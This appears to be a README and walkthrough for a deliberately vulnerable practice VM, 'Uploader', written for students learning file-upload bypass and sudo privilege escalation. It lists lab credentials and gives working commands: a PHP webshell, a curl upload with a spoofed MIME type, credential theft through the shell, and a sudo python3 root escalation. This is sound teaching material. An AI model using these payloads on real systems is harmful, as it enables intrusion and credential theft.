# Uploader

## Introduction
I created this machine for students who want to 
practice server-side vulnerabilities, specifically 
file upload bypass techniques and basic privilege 
escalation via sudo misconfiguration.


## Credentials

| User     | Password  | Access        |
|----------|-----------|---------------|
| uploader | 01672     | VM Admin      |
| ayush    | ayush@123 | SSH User      |
| root     | -         | Via privesc   |

### Key Processes


**Apache2** runs as `www-data` on port 80, serving a 
custom PHP photo blog. The upload functionality at 
/panel/index.php contains intentionally vulnerable 
file upload code that allows PHP5 extension bypass.

**OpenSSH** runs on port 22 for remote access.

Custom source files attached:
- panel/index.php (vulnerable upload handler)
- config.php (contains hardcoded credentials)
### Automation / Crons

No cron jobs or scheduled tasks are configured 
on this machine.

### Firewall Rules

No custom firewall rules are configured. 
Default Ubuntu firewall settings apply.

### Docker

Docker is not used in this machine.

## Walkthrough

### Enumeration

#### STEP:- 1 Nmap Scan
nmap -sV -sC {MACHINE_IP}

Open ports:
- Port 22: SSH (OpenSSH 9.6p1)
- Port 80: HTTP (Apache 2.4.58)
- ![Nmap Scan](./Screenshot_2026-06-26_13-48-52.png)

#### STEP 2:- Web Enumeration
Check {MACHINE_IP} in browser then you get uploader.htb so you have to 
add this MACHINE_IP and url in /etc/hosts 
![Nmap Scan](./Screenshot_2026-06-26_13-48-32.png)

using nano /etc/hosts

then you see web blogs and go to upload section 

### Foothold

#### STEP 3:- File Upload Bypass
The upload form blocks .php files but does not block 
.php5 extension. By also spoofing the MIME type to 
image/jpeg, the filter is bypassed.
![Nmap Scan](./Screenshot_2026-06-26_13-48-14.png)

Create webshell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php5

Upload with spoofed MIME:
curl -X POST http://uploader.htb/panel/index.php \
  -F "file=@shell.php5;type=image/jpeg"
  
  ![Nmap Scan](./Screenshot_2026-06-26_13-49-16.png)

#### STEP 5:- RCE
curl "http://uploader.htb/uploads/shell.php5?cmd=id"
Output: uid=33(www-data)

![Nmap Scan](./Screenshot_2026-06-26_13-49-29.png)

#### STEP 6:- Credential Discovery
curl "http://uploader.htb/uploads/shell.php5?cmd=cat+/var/www/html/config.php"
Output: ayush : ayush@123

![Nmap Scan](./Screenshot_2026-06-26_13-49-39.png)

### STEP 7:- Lateral Movement
ssh ayush@{MACHINE_IP}
![Nmap Scan](./Screenshot_2026-06-26_13-49-51.png)

cat /home/ayush/user.txt

![Nmap Scan](./Screenshot_2026-06-26_13-50-04.png)

### STEP 8:- Privilege Escalation
sudo -l
Output: (ALL) NOPASSWD: /usr/bin/python3
![Nmap Scan](./Screenshot_2026-06-26_13-50-14.png)

sudo python3 -c 'import os; os.system("/bin/bash")'
![Nmap Scan](./Screenshot_2026-06-26_13-50-24.png)

cat /root/root.txt
